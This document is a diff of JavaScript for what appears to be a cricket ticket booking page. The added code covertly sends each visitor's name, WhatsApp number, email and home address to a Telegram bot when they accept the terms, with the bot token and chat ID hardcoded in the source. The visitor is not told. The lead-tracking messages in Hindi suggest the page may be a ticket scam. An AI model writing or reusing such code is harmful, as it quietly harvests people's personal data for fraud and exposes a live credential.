@@ -321,7 +321,7 @@ if (popup) {
 }
 
 // ==========================================
-// 🔥 ACCEPT → GO TO SEATS
+// 🔥 ACCEPT → GO TO SEATS (HINDI TELEGRAM MESSAGE)
 // ==========================================
 const acceptBtn = document.getElementById('accept-tnc-btn');
 if (acceptBtn) {
@@ -336,9 +336,7 @@ if (acceptBtn) {
                 <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #f84464; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
                 <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Getting Things Ready...</h3>
                 <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Moving to Seat Selection</p>
-                <style>
-                    @keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-                </style>
+                <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
             </div>
         `;
         document.body.appendChild(loader);
@@ -347,18 +345,25 @@ if (acceptBtn) {
             fbq('track', 'InitiateCheckout');
         }
 
-        const name = localStorage.getItem('customerName') || "Unknown";
-        const phone = localStorage.getItem('customerPhone') || "Unknown";
+        // 🔥 सारी डिटेल्स लोकल स्टोरेज से निकाल रहे हैं 🔥
+        const name = localStorage.getItem('customerName') || "Not Provided";
+        const phone = localStorage.getItem('customerPhone') || "Not Provided";
+        const email = localStorage.getItem('customerEmail') || "Not Provided";
+        const address = localStorage.getItem('customerAddress') || localStorage.getItem('address') || "Not Provided";
         const matchTitle = match ? match.title : "Unknown Match";
+        const matchDate = match && match.date ? match.date : "";
 
         const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
         const chatId = "6820660513"; 
         
-        const telegramMsg = `🔥 *LEAD MOVED FORWARD! (Event Page)* 🔥\n\n` +
-                            `👤 *Name:* ${name}\n` +
-                            `📞 *WhatsApp:* ${phone}\n` +
-                            `🏏 *Match:* ${matchTitle}\n` +
-                            `👉 *Action:* Accepted T&C, moving to Seat Selection!`;
+        // 🔥 हिंदी टेलीग्राम मैसेज पूरी डिटेल के साथ 🔥
+        const telegramMsg = `🏃 *कस्टमर एक कदम और आगे बढ़ा! (Event Page)* 🏃\n\n` +
+                            `👤 *नाम (Name):* ${name}\n` +
+                            `📞 *नंबर (WhatsApp):* ${phone}\n` +
+                            `📧 *ईमेल (Email):* ${email}\n` +
+                            `🏠 *पता (Address):* ${address}\n` +
+                            `🏏 *मैच (Match):* ${matchTitle} ${matchDate}\n` +
+                            `👉 *स्टेटस:* कस्टमर ने T&C Accept कर लिया है और अब *Seat Selection* पेज पर जा रहा है!`;
 
         const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;
 
@@ -373,9 +378,6 @@ if (acceptBtn) {
     };
 }
 
-// ==========================================
-// 🔥 BOOK BUTTON
-// ==========================================
 const bookNowBtn = document.getElementById('book-now-btn');
 if (bookNowBtn) {
     bookNowBtn.onclick = () => {
